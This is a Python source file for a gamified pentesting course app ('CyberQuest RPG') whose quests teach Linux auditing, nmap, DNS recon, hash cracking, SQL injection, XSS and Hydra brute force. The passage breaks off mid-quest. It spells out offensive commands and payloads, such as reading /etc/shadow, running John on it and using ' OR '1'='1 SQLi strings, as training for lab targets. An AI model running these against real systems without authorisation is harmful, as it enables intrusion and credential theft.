"""
CyberQuest RPG - Hacker Academy
Requirements: pip install customtkinter
Run: python cyberquest_rpg.py
"""

import customtkinter as ctk
from tkinter import messagebox
import json
import os
import subprocess
import sys
import tempfile
from pathlib import Path
from datetime import datetime

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("green")

SCRIPT_DIR = Path(__file__).parent
SAVE_FILE  = SCRIPT_DIR / "cyberquest_save.json"

C = {
    "bg": "#0a0f0a", "bg2": "#0d120d", "bg3": "#111811",
    "border": "#1a2e1a", "acc": "#00ff41", "acc2": "#00cc33",
    "acc3": "#005500", "warn": "#ffcc00", "danger": "#ff3333",
    "blue": "#00aaff", "dim": "#3a5a3a", "fg": "#c0e0c0",
    "fg2": "#7aaa7a", "white": "#e8ffe8", "done_bg": "#061206",
    "done_brd": "#00aa22", "step_bg": "#0e160e", "step_hdr": "#142214",
}

def load_save():
    if SAVE_FILE.exists():
        try:
            with open(SAVE_FILE, "r") as f:
                return json.load(f)
        except Exception:
            pass
    return {"completed_quests": [], "exam_scores": {}, "side_quests_done": [], "seen_requirements": False, "started": datetime.now().isoformat()}

def write_save(data):
    with open(SAVE_FILE, "w") as f:
        json.dump(data, f, indent=2)

REQUIREMENTS_TEXT = """\
CYBERQUEST RPG - GETTING STARTED

> REQUIRED OS
  Parrot Security OS or Kali Linux
  Download: https://www.parrotsec.org/download/

> PYTHON 3 (pre-installed on Parrot)
  python3 --version

> THIS APP
  pip install customtkinter
  python cyberquest_rpg.py

> RECOMMENDED TOOLS (pre-installed on Parrot)
  nmap, wireshark, tcpdump, burpsuite, metasploit-framework
  john, hashcat, hydra, gobuster, nikto, sqlmap

> PRACTICE TARGETS
  Metasploitable 2, DVWA, OWASP Juice Shop, Security Onion
"""

SKILL_TREES = {
    "linux":      {"name": "Linux Mastery",      "icon": "\U0001f427", "color": C["acc"]},
    "networking": {"name": "Networking",          "icon": "\U0001f310", "color": "#00ccff"},
    "crypto":     {"name": "Cryptography",        "icon": "\U0001f510", "color": C["warn"]},
    "recon":      {"name": "Recon & OSINT",       "icon": "\U0001f50d", "color": "#ff9900"},
    "webhack":    {"name": "Web Hacking",         "icon": "\U0001f578\ufe0f", "color": "#ff2266"},
    "passwords":  {"name": "Password Attacks",    "icon": "\U0001f511", "color": "#cc44ff"},
    "exploit":    {"name": "Exploitation",        "icon": "\u26a1", "color": "#ff4444"},
    "defense":    {"name": "Defensive Security",  "icon": "\U0001f6e1\ufe0f", "color": "#4488ff"},
    "siem":       {"name": "SIEM & Detection",    "icon": "\U0001f4e1", "color": "#44ddaa"},
    "governance": {"name": "Frameworks & CVEs",   "icon": "\U0001f4cb", "color": "#aaddaa"},
    "tools":      {"name": "Tools & AI Security", "icon": "\U0001f99e", "color": "#ff8844"},
    "python":     {"name": "Python Scripting",    "icon": "\U0001f40d", "color": C["blue"]},
}

RANKS = [
    {"level":1,"title":"Ghost Recruit","xp":0},{"level":2,"title":"Script Kiddie","xp":100},
    {"level":3,"title":"Terminal Jockey","xp":250},{"level":4,"title":"Packet Sniffer","xp":450},
    {"level":5,"title":"Shell Popper","xp":750},{"level":6,"title":"Root Hunter","xp":1100},
    {"level":7,"title":"Exploit Dev","xp":1600},{"level":8,"title":"Zero-Day Scout","xp":2200},
    {"level":9,"title":"Shadow Operator","xp":3000},{"level":10,"title":"Ghost in the Wire","xp":4000},
    {"level":11,"title":"Cipher Lord","xp":5200},{"level":12,"title":"White Hat Legend","xp":6500},
]

CAREERS = [
    {"title":"SOC Analyst (Tier 1-3)","salary":"$55K-$120K","desc":"Monitor alerts in a Security Operations Center.","skills":"SIEM, log analysis, incident triage, networking","certs":"CompTIA Security+, CySA+, Splunk Core, BTL1","trees":["defense","siem","networking","governance"]},
    {"title":"Penetration Tester","salary":"$80K-$160K","desc":"Ethically hack organizations to expose vulnerabilities.","skills":"Nmap, Burp Suite, Metasploit, web testing, reports","certs":"OSCP, CEH, PNPT, eJPT","trees":["recon","webhack","exploit","passwords"]},
    {"title":"Incident Responder","salary":"$85K-$150K","desc":"Contain active breaches and investigate root cause.","skills":"Forensics, malware analysis, log analysis","certs":"GCIH, GCFA, CySA+, BTL2","trees":["defense","siem","linux","networking"]},
    {"title":"Security Engineer","salary":"$100K-$180K","desc":"Design and maintain security infrastructure.","skills":"Firewall config, IDS/IPS, cloud security, automation","certs":"CISSP, AWS Security, CCSP","trees":["defense","siem","networking","python","linux"]},
    {"title":"Red Team Operator","salary":"$110K-$190K","desc":"Simulate advanced persistent threats.","skills":"Advanced exploitation, C2, evasion, social engineering","certs":"OSCP, OSEP, CRTO, GXPN","trees":["exploit","recon","webhack","passwords"]},
    {"title":"GRC Analyst","salary":"$70K-$130K","desc":"Governance, Risk, and Compliance.","skills":"NIST CSF, ISO 27001, risk assessment, policy writing","certs":"CISSP, CISA, CRISC","trees":["governance"]},
]

def get_rank(xp):
    r = RANKS[0]
    for rank in RANKS:
        if xp >= rank["xp"]: r = rank
    return r

def get_next_rank(xp):
    for rank in RANKS:
        if rank["xp"] > xp: return rank
    return None

def total_xp(save):
    xp = sum(q["xp"] for q in ALL_QUESTS if q["id"] in save.get("completed_quests", []))
    xp += sum(sq["xp"] for sq in BOSS_FIGHTS if sq["id"] in save.get("side_quests_done", []))
    return xp


ALL_QUESTS = [
  {
    "id": "lx01",
    "tree": "linux",
    "tier": 1,
    "xp": 25,
    "title": "Terminal Awakening",
    "brief": "Boot your first session. Build your base of operations.",
    "narrative": "=== LOCATION: The Underground Terminal ===\nYou've just dropped into Parrot OS for the first time.\nThe glowing cursor is waiting. The network is silent.\nYour mission begins here - in the shell.\n\nI need to figure out where I am. What machine is this?\nWho am I logged in as? What's around me?\nBefore I do anything, I need to see the terrain.",
    "objective": "Create your hacker ops folder at ~/ops with subdirectories for scans, reports, and notes. This is your base for every quest that follows.",
    "steps": [
      {
        "title": "Step 1 - Situational Awareness",
        "body": "First commands on any new box:\n  pwd          -> Where am I?\n  whoami       -> Who am I logged in as?\n  hostname     -> What machine is this?\n  id           -> What groups am I in? (look for sudo / docker!)"
      },
      {
        "title": "Step 2 - Map the Terrain",
        "body": "Navigate the filesystem:\n  ls -la       -> All files, including hidden ones\n  ls -lah      -> Same but human-readable sizes\n  cd /         -> Go to root\n  cd ~         -> Go to your home dir\n  cd -         -> Jump back to last dir"
      },
      {
        "title": "Step 3 - The Hacker's Map",
        "body": "Memorize these directories:\n  /etc         -> Config files - GOLD MINE for creds\n  /var/log     -> All logs - IR lives here\n  /tmp         -> Anyone can write here\n  /proc        -> Running processes as virtual filesystem\n  /home        -> User home directories"
      },
      {
        "title": "Step 4 - Explore System Files",
        "body": "Read key files:\n  cat /etc/hostname\n  cat /etc/os-release\n  ls /etc/\n  ls /var/log/\n  cat /etc/passwd"
      }
    ],
    "task": "YOUR TASK - Create your ops base:\n  mkdir -p ~/ops/{scans,reports,notes}\n  echo \"Base established: $(date)\" > ~/ops/notes/log.txt\n  cat ~/ops/notes/log.txt\n\nThis folder is YOUR workspace. Every quest builds on it."
  },
  {
    "id": "lx02",
    "tree": "linux",
    "tier": 1,
    "xp": 25,
    "title": "Intel Gatherer",
    "brief": "Populate your ops base with target data and learn to search.",
    "narrative": "=== LOCATION: The Operator's Workbench ===\nMy ops folder is set up. Now I need to fill it.\nA clean workspace is a deadly workspace.\n\nThe first question after landing on a box:\n\"What interesting files are here?\" grep and find\nare my eyes. The faster I search, the faster I find\nmisconfigs, passwords, and keys.",
    "objective": "Create target and credential files in ~/ops. Learn find and grep.",
    "steps": [
      {
        "title": "Step 1 - Create Target Intel",
        "body": "  echo '10.0.0.1 - web server' > ~/ops/notes/targets.txt\n  echo '10.0.0.2 - db server' >> ~/ops/notes/targets.txt\n  echo '10.0.0.3 - mail server' >> ~/ops/notes/targets.txt"
      },
      {
        "title": "Step 2 - Copy, Move, Backup",
        "body": "  cp ~/ops/notes/targets.txt ~/ops/notes/targets_backup.txt\n  mv ~/ops/notes/targets_backup.txt ~/ops/reports/\n  ls ~/ops/reports/"
      },
      {
        "title": "Step 3 - View Files Safely",
        "body": "  cat /etc/passwd        -> Print whole file\n  head -10 /var/log/syslog -> First 10 lines\n  tail -20 /var/log/auth.log -> Last 20 lines\n  less /etc/shadow       -> Scroll through (q to quit)"
      },
      {
        "title": "Step 4 - Find Files on Disk",
        "body": "  find / -name '*.log' 2>/dev/null\n  find / -perm -4000 -type f 2>/dev/null  -> SUID files!\n  find /home -name '*.txt' 2>/dev/null"
      },
      {
        "title": "Step 5 - Search INSIDE Files",
        "body": "  grep 'Failed' /var/log/auth.log\n  grep -r 'password' /etc/ 2>/dev/null\n  grep -c 'Failed' /var/log/auth.log\n  grep -i 'admin' /etc/passwd"
      }
    ],
    "task": "YOUR TASK - Build your intel file:\n  echo 'admin:password123' > ~/ops/notes/credentials.txt\n  echo 'root:toor' >> ~/ops/notes/credentials.txt\n  echo '10.0.0.1:22 SSH' > ~/ops/scans/open_ports.txt\n  echo '10.0.0.1:80 HTTP' >> ~/ops/scans/open_ports.txt\n\nNext quest: lock down these files with permissions."
  },
  {
    "id": "lx03",
    "tree": "linux",
    "tier": 1,
    "xp": 30,
    "title": "Permission Enforcer",
    "brief": "Lock down your ops files. SUID is your escalation key.",
    "narrative": "=== LOCATION: The Access Control Vault ===\nEvery file on Linux has a lock. Three dials: owner, group, others.\n\nThat credentials file I just created - right now ANYONE on this\nmachine can read it. That's a disaster. Time to lock it down.\nMisconfigured locks are how hackers get root.",
    "objective": "Set proper permissions on ~/ops files. Find SUID binaries.",
    "steps": [
      {
        "title": "Step 1 - Read Permission Dials",
        "body": "  ls -la ~/ops/notes/credentials.txt\n  -rw-r--r--  -> Owner:rw  Group:r  Others:r\n  Numbers: 4=read 2=write 1=execute\n  rwx=7  r-x=5  r--=4  ---=0"
      },
      {
        "title": "Step 2 - Change Permissions",
        "body": "  chmod 600 ~/ops/notes/credentials.txt  -> ONLY you\n  chmod 755 ~/ops/scans/  -> You: full, others: read+enter\n  chmod +x script.sh  -> Add execute bit"
      },
      {
        "title": "Step 3 - SUID: Privilege Escalation",
        "body": "  find / -perm -4000 -type f 2>/dev/null\n  SUID = file runs as FILE'S OWNER (often root!)\n  Check GTFOBins: https://gtfobins.github.io"
      },
      {
        "title": "Step 4 - World-Writable Files",
        "body": "  find / -perm -o+w -type f 2>/dev/null | head -20\n  Anyone can write to these - backdoor opportunity!"
      }
    ],
    "task": "YOUR TASK - Lock down your ops base:\n  chmod 700 ~/ops\n  chmod 600 ~/ops/notes/credentials.txt\n  chmod 644 ~/ops/notes/targets.txt\n  find / -perm -4000 -type f 2>/dev/null > ~/ops/reports/suid_files.txt\n\nVerify: ls -la ~/ops/notes/credentials.txt should show -rw-------"
  },
  {
    "id": "lx04",
    "tree": "linux",
    "tier": 2,
    "xp": 40,
    "title": "Process Assassin",
    "brief": "Hunt running processes and cron jobs. Find the gaps.",
    "narrative": "=== LOCATION: The Process Control Room ===\nEvery running process is a potential vulnerability.\nEvery cron job is a potential backdoor.\n\nI need to know what's running on this box.\nIf root is running a cron job that executes a script\nI can write to... that's game over. I own this machine.",
    "objective": "Enumerate all processes and cron jobs. Save snapshots to ~/ops/reports/.",
    "steps": [
      {
        "title": "Step 1 - What's Running?",
        "body": "  ps aux  -> All processes\n  ps aux | grep python\n  top  -> Live view (q to quit)\n  pstree  -> Process tree"
      },
      {
        "title": "Step 2 - Kill Processes",
        "body": "  kill 1234  -> SIGTERM (graceful)\n  kill -9 1234  -> SIGKILL (immediate)\n  killall apache2"
      },
      {
        "title": "Step 3 - Services (systemd)",
        "body": "  sudo systemctl status ssh\n  sudo systemctl start/stop/enable/disable ssh\n  systemctl list-units --type=service --state=running"
      },
      {
        "title": "Step 4 - CRON JOBS",
        "body": "  crontab -l  -> Your crons\n  sudo crontab -l  -> Root's crons\n  cat /etc/crontab\n  ls /etc/cron.d/\n  For each script: ls -la /path/to/script.sh\n  If world-writable -> inject commands -> root!"
      }
    ],
    "task": "YOUR TASK - Snapshot the system:\n  ps aux > ~/ops/reports/processes.txt\n  sudo crontab -l > ~/ops/reports/root_cron.txt 2>/dev/null\n  ss -tulnp > ~/ops/reports/listening_ports.txt\n\nNext quest: who has access to all of this?"
  },
  {
    "id": "lx05",
    "tree": "linux",
    "tier": 2,
    "xp": 40,
    "title": "User Overlord",
    "brief": "Audit every account, sudo rule, and shadow hash.",
    "narrative": "=== LOCATION: The Identity Archive ===\nEvery Linux box is a collection of identities.\nSome are legitimate. Some are backdoors.\n\nsudo -l is my first command as a low-priv user.\nOne NOPASSWD sudo rule can hand me root instantly.\nDefenders look for UID 0 accounts that aren't root - that's a backdoor.",
    "objective": "Build a complete user audit report in ~/ops/reports/.",
    "steps": [
      {
        "title": "Step 1 - User Database",
        "body": "  cat /etc/passwd\n  Format: username:x:UID:GID:comment:home:shell\n  UID 0 = root level. Any other UID 0 is suspicious."
      },
      {
        "title": "Step 2 - Shadow File",
        "body": "  sudo cat /etc/shadow\n  $1$=MD5(weak) $5$=SHA256 $6$=SHA512 $y$=yescrypt\n  Empty second field = no password!"
      },
      {
        "title": "Step 3 - Who's Here Now?",
        "body": "  who  -> Currently logged in\n  w  -> Logged in + activity\n  last  -> Login history\n  lastb  -> Failed logins (brute force evidence!)"
      },
      {
        "title": "Step 4 - SUDO Check",
        "body": "  sudo -l\n  Look for: (ALL) NOPASSWD: /bin/bash\n  That = instant root. Also check GTFOBins."
      },
      {
        "title": "Step 5 - Find Suspicious Accounts",
        "body": "  awk -F: '$3==0{print}' /etc/passwd  -> UID 0\n  awk -F: '$7!~/nologin/{print}' /etc/passwd  -> Shell users\n  awk -F: '$2==\"\"{print}' /etc/shadow  -> Empty passwords"
      }
    ],
    "task": "YOUR TASK - Full user audit:\n  echo '=== USER AUDIT ===' > ~/ops/reports/user_audit.txt\n  echo '--- UID 0 ---' >> ~/ops/reports/user_audit.txt\n  awk -F: '$3==0{print $1}' /etc/passwd >> ~/ops/reports/user_audit.txt\n  echo '--- sudo -l ---' >> ~/ops/reports/user_audit.txt\n  sudo -l >> ~/ops/reports/user_audit.txt 2>/dev/null\n\nNext: automate EVERYTHING into one script."
  },
  {
    "id": "lx06",
    "tree": "linux",
    "tier": 3,
    "xp": 60,
    "title": "Shell Scripter",
    "brief": "Automate your entire ops workflow into one audit script.",
    "narrative": "=== LOCATION: The Automation Lab ===\nReal operators don't run commands one at a time.\nThey write scripts that run everything in seconds.\n\nI've been doing this manually. In the field, I need one script.\nRun it, get everything. That's what LinPEAS does.\nNow I build my own version.",
    "objective": "Write a bash audit script that combines all previous quest tasks.",
    "steps": [
      {
        "title": "Step 1 - Script Basics",
        "body": "  #!/bin/bash\n  REPORT=~/ops/reports/audit_$(date +%Y%m%d_%H%M%S).txt\n  echo '=== SYSTEM AUDIT ===' > \"$REPORT\"\n  date >> \"$REPORT\""
      },
      {
        "title": "Step 2 - Variables and Conditionals",
        "body": "  TARGET='127.0.0.1'\n  if ping -c 1 -W 1 \"$TARGET\" &>/dev/null; then\n      echo \"$TARGET is UP\"\n  fi"
      },
      {
        "title": "Step 3 - Functions",
        "body": "  check_suid() {\n      echo '=== SUID Files ===' >> \"$REPORT\"\n      find / -perm -4000 -type f 2>/dev/null >> \"$REPORT\"\n  }"
      },
      {
        "title": "Step 4 - Loops",
        "body": "  for port in 21 22 23 80 443 8080; do\n      (echo >/dev/tcp/127.0.0.1/$port) 2>/dev/null && echo \"[OPEN] $port\"  \n  done"
      }
    ],
    "task": "YOUR TASK - Build ~/ops/scripts/audit.sh:\n  Include: system info, SUID files, UID 0 accounts,\n  shell users, open ports, root cron jobs.\n  chmod +x ~/ops/scripts/audit.sh && ./ops/scripts/audit.sh\n\nLinux Mastery complete. The BOSS FIGHT awaits."
  },
  {
    "id": "net01",
    "tree": "networking",
    "tier": 1,
    "xp": 25,
    "title": "Network Foundations",
    "brief": "OSI model, IPs, ports, TCP vs UDP - the hacker's map.",
    "narrative": "=== LOCATION: The Network Map Room ===\nEvery attack travels the network. Every defense monitors it.\nTo hack or defend, I must understand how data moves.\n\nWhen scanning a target, I read the OSI stack from bottom up.\nIs the host reachable? What ports are open? What services run?",
    "objective": "Document the OSI model and run basic network commands. Save to ~/ops/notes/.",
    "steps": [
      {
        "title": "Step 1 - OSI Model",
        "body": "  7 Application  -> HTTP, FTP, SSH, DNS\n  6 Presentation -> SSL/TLS\n  5 Session      -> Session management\n  4 Transport    -> TCP/UDP, ports\n  3 Network      -> IP addresses, routing\n  2 Data Link    -> MAC addresses, ARP\n  1 Physical     -> Cables, wireless"
      },
      {
        "title": "Step 2 - IP Addressing",
        "body": "  ip a  -> Your interfaces and IPs\n  ip route  -> Routing table\n  Private: 10.x.x.x | 172.16-31.x.x | 192.168.x.x"
      },
      {
        "title": "Step 3 - TCP vs UDP",
        "body": "  TCP: SYN -> SYN-ACK -> ACK (reliable)\n  UDP: Fire and forget (fast - DNS, SNMP, DHCP)"
      },
      {
        "title": "Step 4 - Key Ports",
        "body": "  21 FTP  22 SSH  23 Telnet  25 SMTP  53 DNS\n  80 HTTP  443 HTTPS  445 SMB  3389 RDP  8080 Alt-HTTP"
      },
      {
        "title": "Step 5 - Basic Commands",
        "body": "  ping 8.8.8.8  -> Test reachability\n  traceroute 8.8.8.8  -> Trace path\n  ss -tulnp  -> Open ports + process\n  dig google.com A  -> DNS lookup"
      }
    ],
    "task": "YOUR TASK - Create your network reference:\n  echo '=== NETWORK MAP ===' > ~/ops/notes/network_map.txt\n  ip a >> ~/ops/notes/network_map.txt\n  ip route >> ~/ops/notes/network_map.txt\n  ss -tulnp >> ~/ops/notes/network_map.txt"
  },
  {
    "id": "net02",
    "tree": "networking",
    "tier": 1,
    "xp": 30,
    "title": "Packet Hunter",
    "brief": "Capture and read network traffic with tcpdump and Wireshark.",
    "narrative": "=== LOCATION: The Signal Intercept Station ===\nThe network is a river of data. Most swim blindly.\nI'm going to stand on the bank and watch every drop.\n\nBefore encryption dominated, packet sniffing grabbed passwords\nin plaintext. Today it maps behavior and detects anomalies.",
    "objective": "Capture packets and save a .pcap file to ~/ops/scans/.",
    "steps": [
      {
        "title": "Step 1 - tcpdump Basics",
        "body": "  sudo tcpdump -i eth0 -c 20  -> Capture 20 packets\n  sudo tcpdump -i eth0 port 80  -> HTTP only\n  sudo tcpdump -i eth0 -w ~/ops/scans/capture.pcap\n  sudo tcpdump -i eth0 -A port 80  -> ASCII (cleartext!)"
      },
      {
        "title": "Step 2 - Read Output",
        "body": "  Flags: [S]=SYN [S.]=SYN-ACK [.]=ACK [P.]=PSH+ACK [F.]=FIN"
      },
      {
        "title": "Step 3 - Wireshark",
        "body": "  wireshark ~/ops/scans/capture.pcap\n  Filters: tcp.port==80 | ip.addr==x.x.x.x | dns"
      }
    ],
    "task": "YOUR TASK:\n  sudo tcpdump -i any -c 50 -w ~/ops/scans/capture.pcap\n  ls -la ~/ops/scans/capture.pcap\n\nNext: actively scan targets with nmap."
  },
  {
    "id": "net03",
    "tree": "networking",
    "tier": 2,
    "xp": 45,
    "title": "Nmap Ninja",
    "brief": "The recon weapon of choice. Map every target.",
    "narrative": "=== LOCATION: The Recon Outpost ===\nNmap is my first weapon on any engagement.\nBefore I attack, I map. Every open port is a door.\n\nSpeed vs stealth: -T5 triggers every IDS. -T1 whispers past.\n\nONLY scan machines YOU own or have permission to test.",
    "objective": "Run a full nmap scan and save results to ~/ops/scans/.",
    "steps": [
      {
        "title": "Step 1 - Discovery",
        "body": "  nmap -sn 192.168.1.0/24  -> Ping sweep"
      },
      {
        "title": "Step 2 - Port Scanning",
        "body": "  nmap TARGET  -> Top 1000 ports\n  nmap -p- TARGET  -> ALL 65535 ports\n  nmap -p 22,80,443 TARGET  -> Specific ports"
      },
      {
        "title": "Step 3 - Scan Types",
        "body": "  -sS SYN stealth | -sT Full connect | -sU UDP\n  -sV Version detection | -sC Default scripts\n  -O OS detection | -A Aggressive (all combined)"
      },
      {
        "title": "Step 4 - NSE Scripts",
        "body": "  nmap --script=vuln TARGET\n  nmap --script=http-enum TARGET\n  ls /usr/share/nmap/scripts/  -> Browse ~600 scripts"
      },
      {
        "title": "Step 5 - Output Formats",
        "body": "  -oN scan.txt | -oX scan.xml | -oG scan.gnmap\n  -oA prefix  -> All three at once"
      }
    ],
    "task": "YOUR TASK:\n  nmap -sV -sC -oA ~/ops/scans/localhost_scan localhost\n  ls ~/ops/scans/localhost_scan.*\n\nNext: DNS recon."
  },
  {
    "id": "net04",
    "tree": "networking",
    "tier": 3,
    "xp": 55,
    "title": "DNS Deep Dive",
    "brief": "Enumerate DNS. Map infrastructure passively.",
    "narrative": "=== LOCATION: The Domain Intelligence Bureau ===\nDNS is the phone book of the internet.\nA zone transfer hands me their entire internal map.\nServers, mail systems, VPNs, hostnames - without touching their network.",
    "objective": "Perform DNS recon and save results to ~/ops/reports/.",
    "steps": [
      {
        "title": "Step 1 - DNS Lookups",
        "body": "  dig example.com A  -> IPv4\n  dig example.com MX  -> Mail servers\n  dig example.com NS  -> Name servers\n  dig example.com TXT  -> SPF, DMARC"
      },
      {
        "title": "Step 2 - Zone Transfer",
        "body": "  dig axfr @ns1.example.com example.com\n  If misconfigured: every record in the zone"
      },
      {
        "title": "Step 3 - Automated Enum",
        "body": "  dnsrecon -d example.com -t std\n  dnsenum example.com\n  fierce --domain example.com"
      },
      {
        "title": "Step 4 - Email Security",
        "body": "  dig example.com TXT | grep spf\n  dig _dmarc.example.com TXT\n  Missing SPF/DMARC = email spoofing possible!"
      }
    ],
    "task": "YOUR TASK - DNS recon report:\n  echo '=== DNS RECON ===' > ~/ops/reports/dns_recon.txt\n  dig localhost A >> ~/ops/reports/dns_recon.txt\n  cat /etc/hosts >> ~/ops/reports/dns_recon.txt\n  cat /etc/resolv.conf >> ~/ops/reports/dns_recon.txt\n\nNetworking complete. BOSS FIGHT awaits."
  },
  {
    "id": "cr01",
    "tree": "crypto",
    "tier": 1,
    "xp": 25,
    "title": "CIA & Crypto Basics",
    "brief": "CIA Triad, hashing, encoding, encryption.",
    "narrative": "=== LOCATION: The Cipher Chamber ===\nThree words protect everything: Confidentiality, Integrity, Availability.\nEvery control, every tool maps to one of these.\n\nAttackers target whichever is weakest.\nSteal data -> Confidentiality. Tamper -> Integrity. DDoS -> Availability.",
    "objective": "Hash files, encrypt data, and save examples to ~/ops/notes/.",
    "steps": [
      {
        "title": "Step 1 - CIA Triad",
        "body": "  C - CONFIDENTIALITY: Only authorized access\n  I - INTEGRITY: Data not tampered with\n  A - AVAILABILITY: Systems work when needed"
      },
      {
        "title": "Step 2 - Hashing",
        "body": "  echo -n 'password123' | sha256sum\n  sha256sum /usr/bin/ls  -> File integrity\n  Same input = same hash. Change 1 bit = totally different."
      },
      {
        "title": "Step 3 - Encoding (NOT security)",
        "body": "  echo -n 'hello' | base64  -> aGVsbG8=\n  echo -n 'aGVsbG8=' | base64 -d  -> hello\n  Anyone can decode base64!"
      },
      {
        "title": "Step 4 - Encryption",
        "body": "  Symmetric: openssl enc -aes-256-cbc -salt -in file -out file.enc\n  Asymmetric: openssl genrsa -out private.pem 2048"
      }
    ],
    "task": "YOUR TASK:\n  echo 'TOP SECRET DATA' > ~/ops/notes/secret.txt\n  sha256sum ~/ops/notes/secret.txt > ~/ops/notes/secret.sha256\n  openssl enc -aes-256-cbc -salt -in ~/ops/notes/secret.txt -out ~/ops/notes/secret.enc -pass pass:cyberquest"
  },
  {
    "id": "cr02",
    "tree": "crypto",
    "tier": 2,
    "xp": 40,
    "title": "Hash Cracking Lab",
    "brief": "Crack password hashes with John and hashcat.",
    "narrative": "=== LOCATION: The Password Cracking Rig ===\n14 million real passwords. One file. rockyou.txt.\nOffline cracking happens AFTER dumping the database.\nI'm running math against a local file. Speed matters.",
    "objective": "Crack test hashes and document results in ~/ops/reports/.",
    "steps": [
      {
        "title": "Step 1 - Hash Types",
        "body": "  $1$=MD5crypt(weak) $5$=SHA256 $6$=SHA512\n  $y$=yescrypt(strong) $2b$=bcrypt(slow by design)"
      },
      {
        "title": "Step 2 - John the Ripper",
        "body": "  sudo unshadow /etc/passwd /etc/shadow > ~/ops/scans/hashes.txt\n  john --wordlist=/usr/share/wordlists/rockyou.txt ~/ops/scans/hashes.txt\n  john --show ~/ops/scans/hashes.txt"
      },
      {
        "title": "Step 3 - Defenses",
        "body": "  Use bcrypt or argon2 (slow by design)\n  16+ character passphrases\n  Per-user salts\n  Account lockout + MFA"
      }
    ],
    "task": "YOUR TASK:\n  Save hash analysis to ~/ops/reports/hash_analysis.txt\n  Include: hash types found, cracked passwords, defenses.\n\nCryptography complete. BOSS FIGHT awaits."
  },
  {
    "id": "rc01",
    "tree": "recon",
    "tier": 1,
    "xp": 25,
    "title": "Self Scanner",
    "brief": "See yourself through the attacker's eyes.",
    "narrative": "=== LOCATION: The Reconnaissance Dojo ===\nBefore attacking anyone, understand what attackers see on MY machine.\nip a -> ss -tulnp -> nmap localhost -> sudo -l -> cron.\nIn under 2 minutes, I know exactly what's running.",
    "objective": "Run a self-assessment and document your attack surface.",
    "steps": [
      {
        "title": "Step 1 - Network Identity",
        "body": "  ip a | ip route | hostname | cat /etc/hosts"
      },
      {
        "title": "Step 2 - Open Ports",
        "body": "  ss -tulnp  -> What's listening?"
      },
      {
        "title": "Step 3 - Scan Yourself",
        "body": "  nmap -sV localhost\n  nmap --script=vuln localhost"
      }
    ],
    "task": "YOUR TASK:\n  echo '=== SELF-ASSESSMENT ===' > ~/ops/reports/self_scan.txt\n  ip a >> ~/ops/reports/self_scan.txt\n  ss -tulnp >> ~/ops/reports/self_scan.txt\n  nmap -sV localhost >> ~/ops/reports/self_scan.txt"
  },
  {
    "id": "rc02",
    "tree": "recon",
    "tier": 2,
    "xp": 45,
    "title": "OSINT Operator",
    "brief": "Gather intel from public sources only.",
    "narrative": "=== LOCATION: The Intelligence Gathering Station ===\nThe best recon doesn't touch the target.\nJob postings reveal tech stack. LinkedIn shows org chart.\nDNS reveals infrastructure. Shodan shows exposed services.",
    "objective": "Run OSINT tools and build a target profile.",
    "steps": [
      {
        "title": "Step 1 - WHOIS",
        "body": "  whois example.com"
      },
      {
        "title": "Step 2 - Google Dorking",
        "body": "  site:example.com filetype:pdf\n  site:example.com inurl:admin"
      },
      {
        "title": "Step 3 - Tech Fingerprinting",
        "body": "  whatweb http://example.com\n  curl -I http://example.com | grep server"
      }
    ],
    "task": "YOUR TASK:\n  Create ~/ops/reports/osint_report.txt with DNS, WHOIS, tech stack.\n\nRecon complete. BOSS FIGHT awaits."
  },
  {
    "id": "web01",
    "tree": "webhack",
    "tier": 1,
    "xp": 25,
    "title": "Web Recon",
    "brief": "Enumerate web servers and hidden directories.",
    "narrative": "=== LOCATION: The Web Infiltration Staging Area ===\nBefore injecting, before exploiting, I map.\nrobots.txt tells search engines what NOT to index -\nwhich means it's a map of sensitive paths.\n\nONLY use against YOUR lab targets (DVWA, Juice Shop).",
    "objective": "Enumerate a web server's directories and tech stack.",
    "steps": [
      {
        "title": "Step 1 - HTTP with curl",
        "body": "  curl http://TARGET\n  curl -I http://TARGET  -> Headers\n  curl http://TARGET/robots.txt"
      },
      {
        "title": "Step 2 - Directory Brute-Force",
        "body": "  gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt"
      },
      {
        "title": "Step 3 - Tech Fingerprinting",
        "body": "  whatweb http://TARGET"
      }
    ],
    "task": "YOUR TASK:\n  Save headers and directory results to ~/ops/reports/web_recon.txt"
  },
  {
    "id": "web02",
    "tree": "webhack",
    "tier": 2,
    "xp": 50,
    "title": "Injection Master",
    "brief": "SQL injection, XSS, OWASP Top 10.",
    "narrative": "=== LOCATION: The Injection Chamber ===\nEvery input field is a potential doorway.\nIf I control the input, I control the query.\nSQL injection has compromised governments and banks.\n\nONLY on YOUR lab targets (DVWA LOW security).",
    "objective": "Perform SQLi and XSS attacks on DVWA. Document findings.",
    "steps": [
      {
        "title": "Step 1 - SQL Injection",
        "body": "  Login field: ' OR '1'='1\n  Search: ' UNION SELECT null,username,password FROM users--"
      },
      {
        "title": "Step 2 - XSS",
        "body": "  Reflected: <script>alert('XSS')</script>\n  Stored: inject into comment/guestbook"
      },
      {
        "title": "Step 3 - Tools",
        "body": "  sqlmap -u 'http://TARGET/page?id=1' --dbs\n  Burp Suite: intercept and modify requests"
      },
      {
        "title": "Step 4 - Defenses",
        "body": "  Parameterized queries (prevents SQLi)\n  Input validation + output encoding (prevents XSS)\n  Content Security Policy headers"
      }
    ],
    "task": "YOUR TASK:\n  Document each attack in ~/ops/reports/injection_lab.txt\n  Include: attack type, payload, result, and fix.\n\nWeb Hacking complete. BOSS FIGHT awaits."
  },
  {
    "id": "pw01",
    "tree": "passwords",
    "tier": 1,
    "xp": 30,
    "title": "Brute Force Operator",
    "brief": "Online password attacks with Hydra.",
    "narrative": "=== LOCATION: The Brute Force Armory ===\nThe simplest attack is often the most effective.\nTry every password. Hydra automates this against SSH, FTP, HTTP.\nMost organizations still allow unlimited login attempts.",
    "objective": "Build a custom wordlist and understand Hydra.",
    "steps": [
      {
        "title": "Step 1 - Wordlists",
        "body": "  ls /usr/share/wordlists/\n  Create custom: names, company terms, seasons+years"
      },
      {
        "title": "Step 2 - Hydra",
        "body": "  hydra -l admin -P rockyou.txt ssh://TARGET"
      },
      {
        "title": "Step 3 - Defenses",
        "body": "  Account lockout | Rate limiting (fail2ban) | MFA | CAPTCHA"
      }
    ],
    "task": "YOUR TASK:\n  Create ~/ops/wordlists/custom.txt with 20+ entries.\n  Only run Hydra against YOUR lab targets."
  },
  {
    "id": "pw02",
    "tree": "passwords",
    "tier": 2,
    "xp": 40,
    "title": "Credential Harvester",
    "brief": "Credential spraying and reuse techniques.",
